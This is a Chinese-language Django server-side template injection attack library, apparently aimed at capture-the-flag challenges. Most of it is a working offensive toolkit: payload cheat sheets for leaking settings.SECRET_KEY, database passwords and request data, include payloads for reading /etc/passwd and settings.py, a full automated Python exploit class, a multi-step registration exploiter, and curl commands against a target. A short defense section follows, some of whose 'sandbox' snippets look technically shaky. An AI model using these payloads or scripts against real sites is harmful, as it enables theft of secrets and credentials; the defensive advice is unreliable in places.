# SSTI - Django模板注入攻击库

## 概述

Django模板注入是一种服务端模板注入(SSTI)漏洞,当应用程序不当处理用户输入并将其作为Django模板代码解析时发生。攻击者可以利用Django模板语法访问Python对象、执行任意代码、读取敏感文件。

**核心威胁**: 未过滤的用户输入 → 模板字符串构造 → engine.from_string() → 代码执行/文件读取

## Django模板注入原理

### 危险模式

```python
# 危险: 直接将用户输入替换到模板
from django.template import engines

user_input = request.GET['name']  # 用户输入: {{flag}}
template_str = open('template.html').read()
template = engines["django"].from_string(template_str.replace('PLACEHOLDER', user_input))
result = template.render(context)  # 用户输入被当作模板代码执行
```

### 漏洞成因

1. **字符串替换**: 使用`replace()`直接将用户输入嵌入模板
2. **from_string解析**: `engine.from_string()`解析包含用户输入的模板字符串
3. **上下文访问**: render()时传入的上下文变量可被模板访问
4. **Session数据**: 用户输入存储在session中后被模板使用

## 核心攻击技术

### 1. 访问上下文变量

**技术**: 直接使用`{{变量名}}`访问render()传入的上下文

```django
<!-- Payload -->
{{flag}}
{{secret_key}}
{{user.password}}
```

**应用场景**:
- FLAG在render context中
- 敏感配置在模板上下文
- 用户对象包含敏感信息

### 2. 访问Django Settings

**技术**: 通过`{{settings}}`访问Django配置

```django
<!-- 获取SECRET_KEY -->
{{settings.SECRET_KEY}}

<!-- 获取数据库配置 -->
{{settings.DATABASES}}

<!-- 获取所有配置 -->
{% debug %}
```

**应用场景**:
- 泄露SECRET_KEY进行会话伪造
- 获取数据库凭证
- 发现其他敏感配置

### 3. 访问Request对象

**技术**: 通过`{{request}}`访问HTTP请求对象

```django
<!-- 访问GET参数 -->
{{request.GET}}

<!-- 访问POST数据 -->
{{request.POST}}

<!-- 访问Session -->
{{request.session}}

<!-- 访问用户信息 -->
{{request.user}}
```

### 4. 模板标签利用

**技术**: 使用Django内置模板标签

```django
<!-- 循环遍历 -->
{% for key in request.META %}
  {{key}}: {{request.META|key}}
{% endfor %}

<!-- 文件包含 -->
{% include "/etc/passwd" %}
{% include "../../settings.py" %}

<!-- 加载模块 -->
{% load static %}
{% load i18n %}
```

### 5. 执行Python代码

**技术**: 利用特殊对象访问Python运行时

```django
<!-- 通过__class__访问类 -->
{{''.__class__}}

<!-- 访问基类 -->
{{''.__class__.__mro__}}

<!-- 获取所有子类 -->
{{''.__class__.__mro__[1].__subclasses__()}}
```

**高级利用**: 虽然Django模板语法限制较多,但可以通过对象属性链访问

```django
<!-- 访问模块 -->
{{request.__class__.__module__}}

<!-- 访问全局变量 -->
{{request.__class__.__init__.__globals__}}
```

## 完整攻击工具

### Django SSTI自动化利用类

```python
#!/usr/bin/env python3
"""
Django SSTI攻击自动化工具
支持上下文访问、配置泄露、文件读取
"""

import requests
import re
import sys
from urllib.parse import urljoin, quote

class DjangoSSTI:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def test_injection(self, injection_param, payload):
        """
        测试SSTI注入点
        
        Args:
            injection_param: 注入参数名
            payload: 测试载荷
        
        Returns:
            响应文本
        """
        params = {injection_param: payload}
        try:
            r = self.session.get(self.base_url, params=params, timeout=10)
            return r.text
        except Exception as e:
            print(f"[-] 请求错误: {e}")
            return None
    
    def detect_ssti(self, injection_param):
        """
        检测Django SSTI漏洞
        
        Returns:
            bool: 是否存在SSTI
        """
        print("[*] 检测Django SSTI漏洞...")
        
        # 测试基本模板语法
        test_payloads = [
            ("{{7*7}}", "49"),
            ("{{7+7}}", "14"),
            ("{{''|length}}", "0"),
        ]
        
        for payload, expected in test_payloads:
            print(f"[*] 测试: {payload}")
            response = self.test_injection(injection_param, payload)
            if response and expected in response:
                print(f"[+] SSTI漏洞确认! 响应包含: {expected}")
                return True
        
        print("[-] 未检测到SSTI漏洞")
        return False
    
    def extract_context_variable(self, injection_param, var_name):
        """
        提取上下文变量
        
        Args:
            injection_param: 注入参数
            var_name: 变量名
        
        Returns:
            变量值
        """
        print(f"[*] 提取上下文变量: {var_name}")
        payload = f"{{{{{var_name}}}}}"
        response = self.test_injection(injection_param, payload)
        
        if response:
            # 尝试从响应中提取变量值
            print(f"[+] 响应: {response[:200]}")
            return response
        
        return None
    
    def extract_settings(self, injection_param):
        """
        提取Django settings配置
        
        Returns:
            dict: settings内容
        """
        print("[*] 提取Django settings...")
        
        settings_vars = [
            "SECRET_KEY",
            "DEBUG",
            "DATABASES",
            "INSTALLED_APPS",
            "MIDDLEWARE",
            "ROOT_URLCONF",
            "ALLOWED_HOSTS",
        ]
        
        results = {}
        for var in settings_vars:
            payload = f"{{{{settings.{var}}}}}"
            response = self.test_injection(injection_param, payload)
            if response:
                results[var] = response
                print(f"[+] settings.{var}: {response[:100]}")
        
        return results
    
    def exploit_file_read(self, injection_param, file_path):
        """
        尝试通过include标签读取文件
        
        Args:
            file_path: 要读取的文件路径
        
        Returns:
            文件内容
        """
        print(f"[*] 尝试读取文件: {file_path}")
        
        payloads = [
            f"{{% include '{file_path}' %}}",
            f"{{% include \"{file_path}\" %}}",
        ]
        
        for payload in payloads:
            response = self.test_injection(injection_param, payload)
            if response and len(response) > 10:
                print(f"[+] 文件内容:\n{response}")
                return response
        
        print("[-] 文件读取失败")
        return None
    
    def exploit_debug_info(self, injection_param):
        """
        利用debug标签获取调试信息
        
        Returns:
            调试信息
        """
        print("[*] 获取debug信息...")
        payload = "{% debug %}"
        response = self.test_injection(injection_param, payload)
        
        if response:
            print(f"[+] Debug信息:\n{response[:500]}")
            return response
        
        return None
    
    def exploit_request_meta(self, injection_param):
        """
        提取request.META信息
        
        Returns:
            META信息
        """
        print("[*] 提取request.META...")
        
        # 使用for循环遍历META
        payload = "{% for key in request.META %}{{key}}:{{request.META.key}}\\n{% endfor %}"
        response = self.test_injection(injection_param, payload)
        
        if response:
            print(f"[+] request.META:\n{response[:300]}")
            return response
        
        return None
    
    def full_exploit(self, injection_param, target_var="flag"):
        """
        完整利用流程
        
        Args:
            injection_param: 注入参数名
            target_var: 目标变量名(如flag)
        """
        print("=" * 60)
        print("[*] Django SSTI完整利用流程")
        print("=" * 60)
        
        # 1. 检测SSTI
        if not self.detect_ssti(injection_param):
            return False
        
        print()
        
        # 2. 提取目标变量
        print(f"[*] 步骤1: 提取目标变量 {target_var}")
        flag_result = self.extract_context_variable(injection_param, target_var)
        if flag_result and "flag{" in flag_result.lower():
            print(f"[+] 成功获取FLAG!")
            return True
        
        print()
        
        # 3. 提取settings
        print("[*] 步骤2: 提取Django settings")
        self.extract_settings(injection_param)
        
        print()
        
        # 4. 获取debug信息
        print("[*] 步骤3: 获取debug信息")
        self.exploit_debug_info(injection_param)
        
        print()
        
        # 5. 尝试文件读取
        print("[*] 步骤4: 尝试文件读取")
        common_files = [
            "/flag",
            "/flag.txt",
            "/etc/passwd",
            "../../settings.py",
        ]
        
        for file_path in common_files:
            result = self.exploit_file_read(injection_param, file_path)
            if result and "flag{" in result.lower():
                print(f"[+] 在 {file_path} 中发现FLAG!")
                return True
        
        return False

def exploit_django_ssti(target_url, injection_param="name"):
    """
    Django SSTI利用入口函数
    
    Args:
        target_url: 目标URL
        injection_param: 注入参数名
    """
    print(f"[*] 目标URL: {target_url}")
    print(f"[*] 注入参数: {injection_param}")
    print()
    
    exploiter = DjangoSSTI(target_url)
    success = exploiter.full_exploit(injection_param)
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功获取FLAG,但可能获取了其他敏感信息")

# 多步骤注册流程利用示例
class DjangoMultiStepSSTI:
    """
    针对多步骤注册流程的Django SSTI利用
    (用户输入存储在session,后续页面使用)
    """
    
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
    
    def exploit_registration_flow(self, payload="{{flag}}"):
        """
        利用注册流程中的SSTI
        
        Args:
            payload: SSTI载荷
        """
        print("[*] 多步骤注册SSTI利用")
        print(f"[*] Payload: {payload}")
        
        # Step 1: 注入payload到name字段
        print("[*] Step 1: 提交name字段...")
        step1_url = urljoin(self.base_url, "/register/step1/")
        
        data = {
            'name': payload,
            'password': 'password123'
        }
        
        r = self.session.post(step1_url, data=data, allow_redirects=False)
        
        if r.status_code in [200, 302, 303]:
            print("[+] Step 1成功")
        else:
            print(f"[-] Step 1失败: {r.status_code}")
            return False
        
        # Step 2: 提交email
        print("[*] Step 2: 提交email...")
        step2_url = urljoin(self.base_url, "/register/step2/")
        
        r = self.session.post(step2_url, data={'email': 'test@test.com'}, 
                             allow_redirects=False)
        
        if r.status_code in [200, 302, 303]:
            print("[+] Step 2成功")
        else:
            print(f"[-] Step 2失败: {r.status_code}")
            return False
        
        # Step 3: 访问最终页面触发SSTI
        print("[*] Step 3: 访问最终页面...")
        step3_url = urljoin(self.base_url, "/register/step3/")
        
        r = self.session.get(step3_url)
        
        if r.status_code == 200:
            print("[+] Step 3成功")
            print(f"[*] 响应长度: {len(r.text)}")
            
            # 检查FLAG
            if 'flag{' in r.text.lower():
                print("[+] 发现FLAG!")
                match = re.search(r'flag\{[^}]+\}', r.text, re.I)
                if match:
                    print(f"[+] FLAG: {match.group()}")
                    return True
                else:
                    print(f"[*] 响应内容: {r.text[:300]}")
            else:
                print("[-] 未发现FLAG")
                print(f"[*] 响应预览: {r.text[:200]}")
        else:
            print(f"[-] Step 3失败: {r.status_code}")
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python3 django_ssti.py <target_url> [injection_param]")
        print("示例: python3 django_ssti.py http://target:8000 name")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else "name"
    
    # 尝试直接注入
    exploit_django_ssti(target, param)
    
    # 如果是多步骤流程
    print("\n" + "=" * 60)
    print("[*] 尝试多步骤注册流程利用...")
    print("=" * 60 + "\n")
    
    multi_step = DjangoMultiStepSSTI(target)
    multi_step.exploit_registration_flow()
```

## 实战场景

### 场景1: 上下文变量访问

**漏洞代码**:
```python
def view(request):
    name = request.GET['name']
    template = engine.from_string(f"<h1>Hello {name}</h1>")
    return HttpResponse(template.render({'flag': open('/flag').read()}, request))
```

**利用**:
```bash
curl "http://target/?name={{flag}}"
```

### 场景2: Session存储后渲染

**漏洞代码**:
```python
# Step 1
request.session['name'] = form.cleaned_data['name']

# Step 3
template_str = open('template.html').read()
template = engine.from_string(template_str.replace('USERNAME', request.session['name']))
return HttpResponse(template.render({'flag': flag}, request))
```

**利用流程**:
```python
# 1. 注入payload
POST /step1/ 
name={{flag}}&password=test

# 2. 继续流程
POST /step2/
email=test@test.com

# 3. 触发渲染
GET /step3/
# 响应包含FLAG
```

### 场景3: 配置泄露

**利用**:
```django
{{settings.SECRET_KEY}}
{{settings.DATABASES.default.PASSWORD}}
```

### 场景4: 文件读取

**利用**:
```django
{% include "/etc/passwd" %}
{% include "../../settings.py" %}
{% include "/flag" %}
```

## 手动测试命令

### Curl测试

```bash
# 基本检测
curl "http://target/?name={{7*7}}"
# 响应包含49 → SSTI存在

# 提取FLAG
curl "http://target/?name={{flag}}"

# 提取settings
curl "http://target/?name={{settings.SECRET_KEY}}"

# debug信息
curl "http://target/?name={%debug%}"
```

### 多步骤流程

```bash
# 使用curl维持session
curl -c cookies.txt http://target/register/step1/

curl -b cookies.txt -c cookies.txt -X POST http://target/register/step1/ \
  -d "name={{flag}}&password=test"

curl -b cookies.txt -c cookies.txt -X POST http://target/register/step2/ \
  -d "email=test@test.com"

curl -b cookies.txt http://target/register/step3/
```

## Payloads速查表

### 基本检测
```django
{{7*7}}
{{7+7}}
{{''|length}}
{{'test'|upper}}
```

### 变量访问
```django
{{flag}}
{{secret}}
{{user}}
{{request.user}}
```

### Settings访问
```django
{{settings.SECRET_KEY}}
{{settings.DEBUG}}
{{settings.DATABASES}}
```

### 文件操作
```django
{% include "/etc/passwd" %}
{% include "/flag" %}
{% include "../../settings.py" %}
```

### Debug信息
```django
{% debug %}
```

### 循环遍历
```django
{% for key in request.META %}
  {{key}}: {{request.META.key}}
{% endfor %}
```

### 对象探测
```django
{{''.__class__}}
{{''.__class__.__mro__}}
{{request.__class__}}
{{request.__class__.__module__}}
```

## 防御措施

### 1. 永远不要直接拼接用户输入到模板

**错误**:
```python
template = engine.from_string(template_str.replace('PLACEHOLDER', user_input))
```

**正确**:
```python
template = engine.from_string(template_str)
result = template.render({'user_input': user_input})
```

### 2. 使用沙箱环境

```python
from django.template import Template, Context
from django.template.backends.django import DjangoTemplates

# 限制可用标签和过滤器
backend = DjangoTemplates({
    'OPTIONS': {
        'autoescape': True,
        'builtins': [],  # 禁用内置标签
    }
})
```

### 3. 输入验证

```python
# 检查危险字符
dangerous_chars = ['{', '}', '%', '|']
if any(c in user_input for c in dangerous_chars):
    raise ValueError("Invalid input")
```

### 4. Context隔离

```python
# 不要在context中放置敏感信息
# 错误
template.render({'flag': flag, 'secret': secret})

# 正确
template.render({'username': username})
```

### 5. 禁用危险标签

```python
# 在settings.py中配置
TEMPLATES = [{
    'OPTIONS': {
        'builtins': [],  # 不加载默认标签
        'libraries': {},  # 限制可用库
    }
}]
```

## 检测特征

1. **模板解析错误**: 输入`{{}}`导致500错误
2. **计算结果**: `{{7*7}}`返回49
3. **变量回显**: `{{test}}`返回变量值或空
4. **语法高亮**: 响应中模板语法被解析而非原样输出

## 总结

Django SSTI是一种严重的漏洞,主要利用点在于:
- 不当使用`engine.from_string()`与字符串替换
- 上下文变量直接暴露敏感数据
- Django模板语法功能强大(include, debug等)

**关键攻击路径**: 用户输入 → Session存储 → 模板字符串替换 → from_string()解析 → render()执行 → 变量泄露/文件读取
